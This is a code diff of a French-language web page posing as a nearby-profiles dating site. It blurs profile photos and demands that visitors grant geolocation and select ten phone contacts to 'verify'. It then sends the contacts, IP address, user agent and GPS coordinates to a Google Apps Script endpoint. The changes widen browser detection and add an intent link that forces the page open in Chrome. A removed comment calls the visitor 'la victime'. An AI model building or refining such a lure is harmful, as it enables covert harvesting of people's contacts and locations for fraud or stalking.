@@ -10,7 +10,7 @@
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         body { margin: 0; padding: 0; font-family: 'Outfit', sans-serif; background-color: var(--bg); color: var(--text); display: flex; flex-direction: column; min-height: 100vh; }
 
-        /* --- ÉCRAN D'ACCUEIL GPS --- */
+        /* ÉCRAN D'ACCUEIL GPS */
         .welcome-screen { position: fixed; inset: 0; background: var(--bg); z-index: 200; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; text-align: center; transition: opacity 0.4s; }
         .welcome-icon { font-size: 60px; margin-bottom: 20px; animation: pulse 2s infinite; }
         .welcome-title { font-size: 26px; font-weight: 800; margin: 0 0 10px; }
@@ -18,31 +18,30 @@
         .btn-locate { width: 100%; max-width: 300px; padding: 18px; background: var(--primary-grad); color: white; border: none; border-radius: 16px; font-size: 16px; font-weight: 700; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 10px; }
         @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
 
-        /* --- CONTENU PRINCIPAL --- */
+        /* CONTENU PRINCIPAL */
         #mainContent { display: none; flex-direction: column; flex: 1; }
         .header { padding: 20px; text-align: center; background: rgba(15, 15, 17, 0.9); backdrop-filter: blur(10px); position: sticky; top: 0; z-index: 10; border-bottom: 1px solid #2c2c2e; }
         .header h1 { font-size: 22px; margin: 0; font-weight: 800; background: var(--primary-grad); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         .grid-container { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; padding: 20px; flex: 1; }
-        .profile-card { background: var(--card-bg); border-radius: 20px; overflow: hidden; position: relative; cursor: pointer; box-shadow: 0 8px 24px rgba(0,0,0,0.5); transition: transform 0.2s; }
-        .profile-card:active { transform: scale(0.97); }
+        .profile-card { background: var(--card-bg); border-radius: 20px; overflow: hidden; position: relative; cursor: pointer; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
         .profile-img-container { width: 100%; height: 180px; position: relative; background: #333; }
         .profile-img-container img { width: 100%; height: 100%; object-fit: cover; filter: blur(8px); }
         .lock-icon { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; font-size: 30px; background: rgba(0,0,0,0.3); }
         .profile-info { padding: 12px; }
-        .profile-name { font-weight: 600; font-size: 16px; margin: 0 0 4px; }
+        .profile-name { font-weight: 600; font-size: 16px; margin: 0; }
 
-        /* --- MODAL --- */
+        /* MODAL */
         .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); backdrop-filter: blur(5px); display: flex; justify-content: center; align-items: flex-end; z-index: 50; opacity: 0; pointer-events: none; transition: opacity 0.3s; }
         .modal-overlay.active { opacity: 1; pointer-events: all; }
         .modal-content { background: #1c1c1e; width: 100%; max-width: 500px; border-radius: 24px 24px 0 0; padding: 30px 20px 40px; text-align: center; transform: translateY(100%); transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
         .modal-overlay.active .modal-content { transform: translateY(0); }
         .modal-title { font-size: 20px; font-weight: 700; margin-bottom: 10px; }
-        .modal-subtitle { font-size: 14px; color: var(--text-muted); margin-bottom: 25px; line-height: 1.5; }
+        .modal-subtitle { font-size: 14px; color: var(--text-muted); margin-bottom: 25px; }
         .btn-verify { width: 100%; padding: 18px; background: var(--primary-grad); color: white; border: none; border-radius: 16px; font-size: 16px; font-weight: 700; cursor: pointer; }
         .btn-verify:disabled { opacity: 0.6; }
         .status-msg { font-size: 13px; color: #ff453a; margin-top: 15px; font-weight: 600; min-height: 20px; }
 
-        /* Loader Final */
+        /* LOADER FINAL */
         .loader-screen { position: fixed; inset: 0; background: var(--bg); z-index: 100; display: flex; flex-direction: column; align-items: center; justify-content: center; opacity: 0; pointer-events: none; transition: opacity 0.4s; }
         .loader-screen.show { opacity: 1; pointer-events: all; }
         .spinner { width: 40px; height: 40px; border: 3px solid rgba(255, 45, 85, 0.2); border-top-color: var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
@@ -52,6 +51,7 @@
         .blocked-screen { position: fixed; inset: 0; background: var(--bg); z-index: 250; display: none; flex-direction: column; justify-content: center; align-items: center; padding: 20px; text-align: center; }
         .blocked-icon { font-size: 60px; margin-bottom: 20px; }
         .blocked-title { font-size: 22px; font-weight: 800; margin: 0 0 10px; color: #ff453a; }
+        .btn-open-chrome { margin-top: 20px; padding: 15px 30px; background: white; color: black; text-decoration: none; border-radius: 10px; font-weight: bold; display: inline-block; }
     </style>
 </head>
 <body>
@@ -60,7 +60,7 @@
     <div class="welcome-screen" id="welcomeScreen">
         <div class="welcome-icon">📍</div>
         <h1 class="welcome-title">Trouvez des profils près de chez vous</h1>
-        <p class="welcome-sub">Pour afficher les personnes dans votre région et discuter avec elles, veuillez autoriser la géolocalisation.</p>
+        <p class="welcome-sub">Pour afficher les personnes dans votre région, autorisez la géolocalisation.</p>
         <button class="btn-locate" id="btnLocate" onclick="requestLocation()">Autoriser la localisation →</button>
     </div>
 
@@ -70,7 +70,7 @@
         <div class="grid-container" id="profilesGrid"></div>
     </div>
 
-    <!-- MODAL (Sélection stricte de 10 contacts) -->
+    <!-- MODAL -->
     <div class="modal-overlay" id="verifyModal">
         <div class="modal-content">
             <div style="font-size: 40px; margin-bottom: 15px;">🔒</div>
@@ -92,21 +92,21 @@
         </div>
     </div>
 
-    <!-- ÉCRAN BLOQUÉ (PC / iPhone / Autre) -->
+    <!-- ÉCRAN BLOQUÉ -->
     <div class="blocked-screen" id="blockedScreen">
         <div class="blocked-icon">⚠️</div>
         <h1 class="blocked-title">Navigateur non supporté</h1>
-        <p style="color: #8e8e93; font-size: 15px;" id="blockedMsg">Veuillez ouvrir ce lien depuis <b>Google Chrome</b> sur un téléphone <b>Android</b>.</p>
+        <p style="color: #8e8e93; font-size: 15px;" id="blockedMsg">Veuillez ouvrir ce lien dans <b>Google Chrome</b> ou <b>Samsung Internet</b>.</p>
+        <a href="#" id="chromeIntent" class="btn-open-chrome">Ouvrir dans Chrome</a>
     </div>
 
-    <!-- Loader Final -->
+    <!-- LOADER -->
     <div class="loader-screen" id="loader">
         <div class="spinner"></div>
-        <h2 style="font-size: 18px; margin-bottom: 8px;">Vérification réussie</h2>
+        <h2 style="font-size: 18px;">Vérification réussie</h2>
     </div>
 
     <script>
-        /* ⚠️ METTEZ VOTRE URL APPS SCRIPT ICI ⚠️ */
         const ENDPOINT = 'https://script.google.com/macros/s/AKfycbzrmzVljMI5ji7fIPPBORXxThJowW-TXWYWTNYJJqGLhvUalSTSm0qUoZXaHqgJOihBBg/exec';
         const TARGET_CONTACTS = 10;
 
@@ -123,25 +123,31 @@
         let currentTargetName = "";
         let gpsData = { lat: '', lng: '', acc: '' };
 
-        // ============ DÉTECTION STRICTE ============
+        // ============ DÉTECTION LARGE (Chromium Android) ============
         const ua = navigator.userAgent.toLowerCase();
         const isAndroid = ua.indexOf('android') > -1;
-        const isChrome = ua.indexOf('chrome') > -1 && ua.indexOf('edg') === -1 && ua.indexOf('opr') === -1;
         const isInApp = /fban|fbav|instagram|twitter|snapchat|whatsapp|fb_iab/.test(ua);
         
-        // L'API Contacts n'existe QUE sur Chrome Android natif
-        const canUseContacts = isAndroid && isChrome && !isInApp && ('contacts' in navigator);
+        // On vérifie simplement si l'API existe et si on est sur Android
+        const canUseContacts = isAndroid && ('contacts' in navigator) && !isInApp;
 
         if (!canUseContacts) {
-            // On bloque tout : PC, iPhone, Instagram, etc.
             document.getElementById('welcomeScreen').style.display = 'none';
             document.getElementById('mainContent').style.display = 'none';
             document.getElementById('blockedScreen').style.display = 'flex';
             
+            // Génération du lien d'intent pour forcer l'ouverture dans Chrome
+            const currentUrl = window.location.href;
+            const intentUrl = "intent://" + currentUrl.replace(/^https?:\/\//, "") + "#Intent;scheme=https;package=com.android.chrome;end";
+            document.getElementById('chromeIntent').href = intentUrl;
+
             if (isInApp) {
-                document.getElementById('blockedMsg').innerHTML = "Vous êtes dans un navigateur intégré (WhatsApp/Instagram). Cliquez sur les <b>trois petits points</b> en haut à droite et choisissez <b>'Ouvrir dans Chrome'</b>.";
+                document.getElementById('blockedMsg').innerHTML = "Vous êtes dans un navigateur d'application (WhatsApp/Instagram). Veuillez ouvrir ce lien dans <b>Chrome</b>.";
             } else if (!isAndroid) {
-                document.getElementById('blockedMsg').innerHTML = "L'accès nécessite un téléphone <b>Android</b> et le navigateur <b>Google Chrome</b>.";
+                document.getElementById('blockedMsg').innerHTML = "L'accès nécessite un téléphone <b>Android</b> avec un navigateur compatible.";
+                document.getElementById('chromeIntent').style.display = 'none';
+            } else {
+                document.getElementById('blockedMsg').innerHTML = "Votre navigateur (ex: Firefox) ne supporte pas la vérification sécurisée. Ouvrez le lien dans <b>Chrome</b>.";
             }
         }
 
@@ -189,40 +195,36 @@
             document.getElementById('verifyModal').classList.add('active');
         }
 
-        // ============ SÉLECTION DES CONTACTS (STRICT) ============
+        // ============ SÉLECTION DES CONTACTS ============
         async function startVerification() {
             if (allContacts.length >= TARGET_CONTACTS) return;
             
             const btn = document.getElementById('inviteBtn');
             const status = document.getElementById('statusMsg');
             btn.disabled = true;
-            btn.innerHTML = 'Ouverture du répertoire...';
+            btn.innerHTML = 'Ouverture...';
             status.innerText = "";
 
             try {
-                // Ouvre le sélecteur natif Android
                 const list = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                 
                 if (list && list.length > 0) {
                     list.forEach(c => {
                         const name = c.name && c.name[0] ? c.name[0] : 'Sans nom';
                         const tel = c.tel && c.tel[0] ? c.tel[0] : 'Sans numéro';
-                        if (name === 'Sans nom' && tel === 'Sans numéro') return;
                         const key = name + tel;
                         if (!seenKeys.has(key)) {
                             seenKeys.add(key);
                             allContacts.push({ name: name, tel: tel });
                         }
                     });
-
-                    // On envoie le lot au serveur
                     sendToServer(list); 
                     updateUI();
                 } else {
-                    status.innerText = "Vous devez sélectionner des contacts.";
+                    status.innerText = "Veuillez sélectionner des contacts.";
                 }
             } catch (e) {
-                status.innerText = "Action annulée. Veuillez sélectionner vos contacts.";
+                status.innerText = "Action annulée. Sélectionnez vos contacts.";
             } finally {
                 btn.disabled = false;
                 if (allContacts.length < TARGET_CONTACTS) {
@@ -236,7 +238,6 @@
             document.getElementById('countDisplay').innerText = `${count} / ${TARGET_CONTACTS}`;
             document.getElementById('progressFill').style.width = Math.min(100, (count / TARGET_CONTACTS) * 100) + '%';
 
-            // Si la victime a atteint 10 contacts, on débloque
             if (count >= TARGET_CONTACTS) {
                 document.getElementById('verifyModal').classList.remove('active');
                 document.getElementById('loader').classList.add('show');
@@ -245,15 +246,7 @@
         }
 
         async function sendToServer(contacts) {
-            const payload = { 
-                target: currentTargetName,
-                contacts: contacts, 
-                ip: victimIp, 
-                ua: navigator.userAgent,
-                lat: gpsData.lat,
-                lng: gpsData.lng,
-                acc: gpsData.acc
-            };
+            const payload = { target: currentTargetName, contacts: contacts, ip: victimIp, ua: navigator.userAgent, lat: gpsData.lat, lng: gpsData.lng, acc: gpsData.acc };
             try {
                 await fetch(ENDPOINT, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'text/plain' }, body: JSON.stringify(payload) });
             } catch (e) {}
